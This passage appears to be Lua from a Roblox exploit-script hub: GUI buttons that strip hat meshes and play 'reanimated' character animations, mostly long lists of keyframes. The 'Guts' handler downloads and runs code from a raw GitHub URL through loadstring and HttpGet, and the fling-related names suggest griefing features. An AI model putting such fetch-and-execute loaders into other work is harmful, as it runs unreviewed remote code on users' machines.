	LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

	Mode='1'

	mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
		if k == 'r' then-- first mode
			Mode='1'
		elseif k == 'e' then-- second mode
			Mode='2'
		elseif k == 'urkeybind' then-- third mode
			Mode='3'
		end
	end)



	attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
		Mode='Attack0'
		wait(1) -- Time Of Attack
		Mode='Attack1'
	end)



	coroutine.wrap(function()
		while true do -- anim changer
			if HumanDied then mousechanger:Disconnect() break end
			sine = sine + speed
			local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
			local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
			local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
			local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
			if lookvector > reanim.Humanoid.WalkSpeed then
				lookvector = reanim.Humanoid.WalkSpeed
			end
			if lookvector < -reanim.Humanoid.WalkSpeed then
				lookvector = -reanim.Humanoid.WalkSpeed
			end
			if rightvector > reanim.Humanoid.WalkSpeed then
				rightvector = reanim.Humanoid.WalkSpeed
			end
			if rightvector < -reanim.Humanoid.WalkSpeed then
				rightvector = -reanim.Humanoid.WalkSpeed
			end
			local lookvel = lookvector / reanim.Humanoid.WalkSpeed
			local rightvel = rightvector / reanim.Humanoid.WalkSpeed
			if Mode == '1' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.2*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10.4*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(-33+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.5+0*math.cos(sine/13),-0.3+0*math.cos(sine/13))*ANGLES(RAD(0+3*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				elseif Root.Velocity.Magnitude < 20 then -- walk
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+10*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.2*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-10.4*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+-30*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+20*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.5+0*math.cos(sine/13),-0.4+0*math.cos(sine/13))*ANGLES(RAD(34+15*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == '2' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),-0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-37+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RS.C0 = RS.C0:Lerp(CF(0+3*math.cos(sine/1),1+-2*math.cos(sine/1),0+8*math.cos(sine/1))*ANGLES(RAD(130+10*math.cos(sine/1)),RAD(32+0*math.cos(sine/1)),RAD(-26+0*math.cos(sine/1))),.3)
					LS.C0 = LS.C0:Lerp(CF(0+5*math.cos(sine/1),0.5+4*math.cos(sine/1),0+-7*math.cos(sine/1))*ANGLES(RAD(94+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),0+-0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(1+0*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.5+0*math.cos(sine/2),-0.6+0*math.cos(sine/2))*ANGLES(RAD(36+15*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
				elseif Root.Velocity.Magnitude < 20 then -- walk
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),-0.5+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-37+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RS.C0 = RS.C0:Lerp(CF(0+3*math.cos(sine/1),1+-2*math.cos(sine/1),0+8*math.cos(sine/1))*ANGLES(RAD(130+10*math.cos(sine/1)),RAD(32+0*math.cos(sine/1)),RAD(-26+0*math.cos(sine/1))),.3)
					LS.C0 = LS.C0:Lerp(CF(0+5*math.cos(sine/1),0.5+4*math.cos(sine/1),0+-7*math.cos(sine/1))*ANGLES(RAD(94+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1)),RAD(0+0*math.cos(sine/1))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),0+-0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(1+0*math.cos(sine/13)),RAD(-6+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(3+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.5+0*math.cos(sine/2),-0.6+0*math.cos(sine/2))*ANGLES(RAD(36+15*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == '3' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					--idle clerp here
				elseif Root.Velocity.Magnitude < 20 then -- walk
					--walk clerp here
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == 'Attack0' then
				NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(5+0*math.cos(sine/13)),RAD(-37+0*math.cos(sine/13)),RAD(1+0*math.cos(sine/13))),.3)
				RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-13+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0.5+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(105+0*math.cos(sine/13)),RAD(18+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13))),.3)
				LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(101+0*math.cos(sine/13)),RAD(18+0*math.cos(sine/13)),RAD(-44+0*math.cos(sine/13))),.3)
				RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(18+0*math.cos(sine/13)),RAD(-51+0*math.cos(sine/13)),RAD(12+0*math.cos(sine/13))),.3)
				LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(3+0*math.cos(sine/13)),RAD(-2+0*math.cos(sine/13)),RAD(-4+0*math.cos(sine/13))),.3)
				reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.6+0*math.cos(sine/2),-0.5+0*math.cos(sine/2))*ANGLES(RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
			elseif Mode == 'Attack1' then
				NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/13),0+0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-13+0*math.cos(sine/13)),RAD(-30+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/13),0+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(101+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(14+0*math.cos(sine/13))),.3)
				LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0.5+0.1*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(105+0*math.cos(sine/13)),RAD(-15+0*math.cos(sine/13)),RAD(-15+0*math.cos(sine/13))),.3)
				RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+-0.1*math.cos(sine/13),-0.2+0*math.cos(sine/13))*ANGLES(RAD(21+0*math.cos(sine/13)),RAD(30+0*math.cos(sine/13)),RAD(-11+0*math.cos(sine/13))),.3)
				reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0 = reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/2),0.6+0*math.cos(sine/2),-0.5+0*math.cos(sine/2))*ANGLES(RAD(21+2*math.cos(sine/2)),RAD(0+0*math.cos(sine/2)),RAD(0+0*math.cos(sine/2))),.3)
			end
			srv.RenderStepped:Wait()
		end
	end)()

	--This was copied from neptunian V
	local muter = false
	local ORGID = 335167645
	local ORVOL = 1.15
	local ORPIT = 1.01
	local kan = Instance.new("Sound",char)
	kan.Volume = 0
	if not NoSound then
		kan.Volume = 1.15
	end
	kan.TimePosition = 0
	kan.PlaybackSpeed = 1.01
	kan.Pitch = 1.01
	kan.SoundId = "rbxassetid://335167645"
	kan.Name = "Saitama"
	kan.Looped = true
	kan:Play()
	--Created using Nexo Animator
end)
UICorner_30.Parent = Saitama

Guts.Name = "Guts"
Guts.Parent = FlingScriptsFrame
Guts.BackgroundColor3 = Color3.fromRGB(45, 70, 88)
Guts.Position = UDim2.new(0.0492126346, 0, 0.459440231, 0)
Guts.Size = UDim2.new(0, 143, 0, 43)
Guts.Font = Enum.Font.Nunito
Guts.Text = "Guts"
Guts.TextColor3 = Color3.fromRGB(238, 238, 238)
Guts.TextSize = 32.000
Guts.MouseButton1Click:Connect(function()
	local HatChar = game.Players.LocalPlayer.Character
	local Hat = HatChar:FindFirstChild("InternationalFedora")
	local Hat2 = HatChar:FindFirstChild("WDW_FoamFinger")

	Hat2.Handle.SpecialMesh:Destroy()
	Hat.Handle.SpecialMesh:Destroy()




	HumanDied = false
	local reanim
	function noplsmesh(hat)
		_G.OldCF=workspace.Camera.CFrame
		oldchar=game.Players.LocalPlayer.Character
		game.Players.LocalPlayer.Character=workspace[game.Players.LocalPlayer.Name]
		for i,v in next, workspace[game.Players.LocalPlayer.Name][hat]:GetDescendants() do
			if v:IsA('Mesh') or v:IsA('SpecialMesh') then
				v:Remove()
			end
		end
		game.Players.LocalPlayer.Character=oldchar
		wait()
		workspace.Camera.CFrame=_G.OldCF
		game.Players.LocalPlayer.Character=oldchar
	end
	_G.ClickFling=false -- Set this to true if u want.
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/XeneonPlays/Nexo/main/NexoPD'),true))()

	IT = Instance.new
	CF = CFrame.new
	VT = Vector3.new
	RAD = math.rad
	C3 = Color3.new
	UD2 = UDim2.new
	BRICKC = BrickColor.new
	ANGLES = CFrame.Angles
	EULER = CFrame.fromEulerAnglesXYZ
	COS = math.cos
	ACOS = math.acos
	SIN = math.sin
	ASIN = math.asin
	ABS = math.abs
	MRANDOM = math.random
	FLOOR = math.floor

	speed = 1
	sine = 1
	srv = game:GetService('RunService')

	function hatset(yes,part,c1,c0,nm)
		reanim[yes].Handle.AccessoryWeld.Part1=reanim[part]
		reanim[yes].Handle.AccessoryWeld.C1=c1 or CFrame.new()
		reanim[yes].Handle.AccessoryWeld.C0=c0 or CFrame.new()--3bbb322dad5929d0d4f25adcebf30aa5
		if nm==true then
			noplsmesh(yes)
		end
	end

	--put the hat script converted below

	reanim = game.Players.LocalPlayer.Character.CWExtra.NexoPD
	RJ = reanim.HumanoidRootPart.RootJoint
	RS = reanim.Torso['Right Shoulder']
	LS = reanim.Torso['Left Shoulder']
	RH = reanim.Torso['Right Hip']
	LH = reanim.Torso['Left Hip']
	Root = reanim.HumanoidRootPart
	NECK = reanim.Torso.Neck
	NECK.C0 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	NECK.C1 = CF(0,-0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C1 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RJ.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C1 = CF(-0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C1 = CF(0.5,0.5,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C1 = CF(0,1,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LH.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	RS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))
	LS.C0 = CF(0,0,0)*ANGLES(RAD(0),RAD(0),RAD(0))

	Mode='1'

	mousechanger=game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
		if k == '1' then-- first mode
			Mode='1'
		elseif k == 'e' then-- second mode
			Mode='2'
		elseif k == 'urkeybind' then-- third mode
			Mode='3'
		end
	end)



	attacklol=game.Players.LocalPlayer:GetMouse().Button1Down:Connect(function()
		Mode='Attack0'
		wait(0.1) -- time of attack u can edit this
		Mode='Attack1'
		wait(0.1)
		Mode='Attack3'
		wait(0.4)
		Mode ='2'
	end)



	coroutine.wrap(function()
		while true do -- anim changer
			if HumanDied then mousechanger:Disconnect() attacklol:Disconnect() break end
			sine = sine + speed
			local rlegray = Ray.new(reanim["Right Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local rlegpart, rlegendPoint = workspace:FindPartOnRay(rlegray, char)
			local llegray = Ray.new(reanim["Left Leg"].Position + Vector3.new(0, 0.5, 0), Vector3.new(0, -2, 0))
			local llegpart, llegendPoint = workspace:FindPartOnRay(llegray, char)
			local rightvector = (Root.Velocity * Root.CFrame.rightVector).X + (Root.Velocity * Root.CFrame.rightVector).Z
			local lookvector = (Root.Velocity * Root.CFrame.lookVector).X + (Root.Velocity * Root.CFrame.lookVector).Z
			if lookvector > reanim.Humanoid.WalkSpeed then
				lookvector = reanim.Humanoid.WalkSpeed
			end
			if lookvector < -reanim.Humanoid.WalkSpeed then
				lookvector = -reanim.Humanoid.WalkSpeed
			end
			if rightvector > reanim.Humanoid.WalkSpeed then
				rightvector = reanim.Humanoid.WalkSpeed
			end
			if rightvector < -reanim.Humanoid.WalkSpeed then
				rightvector = -reanim.Humanoid.WalkSpeed
			end
			local lookvel = lookvector / reanim.Humanoid.WalkSpeed
			local rightvel = rightvector / reanim.Humanoid.WalkSpeed
			if Mode == '1' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					hatset('WDW_FoamFinger','Torso',CFrame.new(),reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.8+0*math.cos(sine/13),-0.8+0*math.cos(sine/13))*ANGLES(RAD(20+5*math.cos(sine/13)),RAD(0+10*math.cos(sine/13)),RAD(0+10*math.cos(sine/13))),1),false)
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/90),-0.1+0.1*math.cos(sine/90),0+0*math.cos(sine/90))*ANGLES(RAD(10+-3*math.cos(sine/90)),RAD(0+0*math.cos(sine/90)),RAD(0+0*math.cos(sine/90))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/30),0+-0.2*math.cos(sine/30),0+0*math.cos(sine/30))*ANGLES(RAD(200+0*math.cos(sine/30)),RAD(20+0*math.cos(sine/30)),RAD(0+0*math.cos(sine/30))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/30),0.5+-0.2*math.cos(sine/30),0+0*math.cos(sine/30))*ANGLES(RAD(13+0*math.cos(sine/30)),RAD(49+0*math.cos(sine/30)),RAD(4+0*math.cos(sine/30))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.7+0*math.cos(sine/40),-1+0.006*math.cos(sine/40),-0.5+0*math.cos(sine/40))*ANGLES(RAD(-10+0*math.cos(sine/40)),RAD(-45+0*math.cos(sine/40)),RAD(0+0*math.cos(sine/40))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.7+0*math.cos(sine/40),-1+0.06*math.cos(sine/40),-0.5+0*math.cos(sine/40))*ANGLES(RAD(-10+0*math.cos(sine/40)),RAD(45+0*math.cos(sine/40)),RAD(0+0*math.cos(sine/40))),.3)
					hatset('InternationalFedora','Left Arm',CFrame.new(),reanim['InternationalFedora'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.7+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),1),false)
					hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),2+0*math.cos(sine/13),-0+0*math.cos(sine/13))*ANGLES(RAD(-27+0*math.cos(sine/13)),RAD(20+0*math.cos(sine/13)),RAD(57+0*math.cos(sine/13))),1),false)
				elseif Root.Velocity.Magnitude < 20 then -- walk
					hatset('WDW_FoamFinger','Torso',CFrame.new(),reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.8+0*math.cos(sine/13),-0.8+0*math.cos(sine/13))*ANGLES(RAD(20+5*math.cos(sine/13)),RAD(0+10*math.cos(sine/13)),RAD(0+10*math.cos(sine/13))),1),false)
					hatset('InternationalFedora','Left Arm',CFrame.new(),reanim['InternationalFedora'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.7+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),1),false)
					hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),2+0*math.cos(sine/13),-0+0*math.cos(sine/13))*ANGLES(RAD(-27+0*math.cos(sine/13)),RAD(20+0*math.cos(sine/13)),RAD(57+0*math.cos(sine/13))),1),false)
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/90),-0.1+0.1*math.cos(sine/90),0+0*math.cos(sine/90))*ANGLES(RAD(10+-3*math.cos(sine/90)),RAD(0+0*math.cos(sine/90)),RAD(0+0*math.cos(sine/90))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/30),0+-0.2*math.cos(sine/30),0+0*math.cos(sine/30))*ANGLES(RAD(200+0*math.cos(sine/30)),RAD(20+0*math.cos(sine/30)),RAD(0+0*math.cos(sine/30))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/30),0.5+-0.2*math.cos(sine/30),0+0*math.cos(sine/30))*ANGLES(RAD(13+0*math.cos(sine/30)),RAD(49+0*math.cos(sine/30)),RAD(4+0*math.cos(sine/30))),.3)
					RH.C0 = RH.C0:Lerp(CF(0.5+0*math.cos(sine/13),-1+0.006*math.cos(sine/13),0+-0.5*math.cos(sine/13))*ANGLES(RAD(-10+35*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-0.5+0*math.cos(sine/13),-1+0.06*math.cos(sine/13),0+0.5*math.cos(sine/13))*ANGLES(RAD(-10+-35*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
				elseif Root.Velocity.Magnitude > 20 then -- run
					--run clerp here
				end
			elseif Mode == '2' then
				if Root.Velocity.y > 1 then -- jump
					--jump clerp here
				elseif Root.Velocity.y < -1 then -- fall
					--fall clerp here
				elseif Root.Velocity.Magnitude < 2 then -- idle
					hatset('WDW_FoamFinger','Torso',CFrame.new(),reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.8+0*math.cos(sine/13),-0.8+0*math.cos(sine/13))*ANGLES(RAD(20+5*math.cos(sine/13)),RAD(0+10*math.cos(sine/13)),RAD(0+10*math.cos(sine/13))),1),false)
					NECK.C0 = NECK.C0:Lerp(CF(0+0*math.cos(sine/13),1+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13)),RAD(0+0*math.cos(sine/13))),.3)
					RJ.C0 = RJ.C0:Lerp(CF(0+0*math.cos(sine/15),-0.6+0.05*math.cos(sine/15),0+0*math.cos(sine/15))*ANGLES(RAD(-45+0*math.cos(sine/15)),RAD(0+0*math.cos(sine/15)),RAD(0+0*math.cos(sine/15))),.3)
					RS.C0 = RS.C0:Lerp(CF(1+0*math.cos(sine/30),0+0.1*math.cos(sine/30),-0.5+0*math.cos(sine/30))*ANGLES(RAD(145+0*math.cos(sine/30)),RAD(0+0*math.cos(sine/30)),RAD(0+0*math.cos(sine/30))),.3)
					LS.C0 = LS.C0:Lerp(CF(-1+0*math.cos(sine/13),0+0*math.cos(sine/13),-1+0*math.cos(sine/13))*ANGLES(RAD(45+0*math.cos(sine/13)),RAD(-5+0*math.cos(sine/13)),RAD(4+0*math.cos(sine/13))),.3)
					RH.C0 = RH.C0:Lerp(CF(1+0*math.cos(sine/13),-1+0.05*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(44+0*math.cos(sine/13)),RAD(69+0*math.cos(sine/13)),RAD(-36+0*math.cos(sine/13))),.3)
					LH.C0 = LH.C0:Lerp(CF(-1+0*math.cos(sine/13),-1+0.05*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(64+0*math.cos(sine/13)),RAD(131+0*math.cos(sine/13)),RAD(-25+0*math.cos(sine/13))),.3)
					hatset('Back_AccAccessory','Right Arm',CFrame.new(),reanim['Back_AccAccessory'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),1.6+0*math.cos(sine/13),0+0*math.cos(sine/13))*ANGLES(RAD(-90+0*math.cos(sine/13)),RAD(-3+0*math.cos(sine/13)),RAD(90+0*math.cos(sine/13))),1),false)
				elseif Root.Velocity.Magnitude < 20 then -- walk
					hatset('WDW_FoamFinger','Torso',CFrame.new(),reanim['WDW_FoamFinger'].Handle.AccessoryWeld.C0:Lerp(CF(0+0*math.cos(sine/13),0.8+0*math.cos(sine/13),-0.8+0*math.cos(sine/13))*ANGLES(RAD(20+5*math.cos(sine/13)),RAD(0+10*math.cos(sine/13)),RAD(0+10*math.cos(sine/13))),1),false)
